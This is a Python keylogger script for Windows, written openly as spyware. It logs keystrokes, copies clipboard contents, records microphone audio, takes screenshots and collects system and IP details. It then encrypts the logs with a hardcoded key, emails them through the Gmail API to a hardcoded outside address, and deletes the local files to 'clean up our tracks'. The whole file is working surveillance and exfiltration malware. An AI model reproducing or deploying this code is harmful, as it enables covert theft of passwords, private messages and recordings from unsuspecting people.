# keylogger.py
# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import sounddevice
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

import sounddevice
from scipy.io.wavfile import write

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import os
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import mimetypes
import base64
from email.mime.text import MIMEText
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from requests import HTTPError

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
file_path1 = "C:\\Users\\USER\\PycharmProjects\\pythonProject1\\Project"
extend1 = "image_"
screenshot_information = ".png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

total_runtime_limit = 120  # 2 minutes
start_time = time.time()
time_iteration = 1
number_of_iterations_end = 1

username = getpass.getuser()

key = "YQwktLzpDxJZ6vgEuZvMmOgT66HOSXEdx2ltmX3GhAo="
# Generate an encryption key from the Cryptography folder

file_path = "C:\\Users\\USER\\PycharmProjects\\pythonProject1\\Project"  # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend


# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")


copy_clipboard()


# get the microphone
def microphone():
    fs = 44100
    second = 3

    record_voice = sounddevice.rec(int(second * fs), samplerate=fs, channels=2)
    sounddevice.wait()

    write(file_path + extend + audio_information, fs, record_voice)


microphone()


# get screenshots
def screenshot():
    for _ in range(12):  # 12 iterations for 2 minutes (12 * 10 seconds = 120 seconds)
        if time.time() - start_time >= total_runtime_limit:
            break

        im = ImageGrab.grab()
        current_time = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        file_name = file_path1 + extend1 + current_time + screenshot_information
        im.save(file_name)
        time.sleep(30)


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e,
                        file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    count += 1

time.sleep(120)
CLIENT_SECRET_FILE = 'credentials.json'
API_NAME = 'gmail'
API_VERSION = 'v1'

SCOPES = [
    "https://www.googleapis.com/auth/gmail.send"
]
flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
creds = flow.run_local_server(port=0)

service = build('gmail', 'v1', credentials=creds)

file_attachments = ['C:\\Users\\USER\\PycharmProjects\\pythonProject1\\Project\\audio.wav',
                    'C:\\Users\\USER\\PycharmProjects\\pythonProject1\\Project\\e_clipboard.txt',
                    'C:\\Users\\USER\\PycharmProjects\\pythonProject1\\Project\\e_key_log.txt',
                    'C:\\Users\\USER\\PycharmProjects\\pythonProject1\\Project\\e_systeminfo.txt']

emailMsg = 'Project files attached'

# create email message
mimeMessage = MIMEMultipart()
mimeMessage['to'] = 'happytsubaki189@gmail.com'
mimeMessage['subject'] = 'You got files'
mimeMessage.attach(MIMEText(emailMsg, 'plain'))

# Attach files
for attachment in file_attachments:
    content_type, encoding = mimetypes.guess_type(attachment)
    main_type, sub_type = content_type.split('/', 1)
    file_name = os.path.basename(attachment)

    f = open(attachment, 'rb')

    myFile = MIMEBase(main_type, sub_type)
    myFile.set_payload(f.read())
    myFile.add_header('Content-Disposition', 'attachment', filename=file_name)
    encoders.encode_base64(myFile)

    f.close()

    mimeMessage.attach(myFile)

raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()

message = service.users().messages().send(
    userId='me',
    body={'raw': raw_string}).execute()

print(message)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, audio_information]

# Delete files
for file in delete_files:
    try:
        os.remove(file)
        print(f"Deleted: {file}")
    except FileNotFoundError:
        print(f"File {file} not found.")
    except Exception as e:
        print(f"Error deleting {file}: {e}")


def delete_png_files(directory):
    for filename in os.listdir(directory):
        if filename.endswith(".png"):
            os.remove(os.path.join(directory, filename))
            print(f"Deleted file: {filename}")


# Example usage:
directory_path = "C:\\Users\\USER\\PycharmProjects\\pythonProject1\\"
delete_png_files(directory_path)
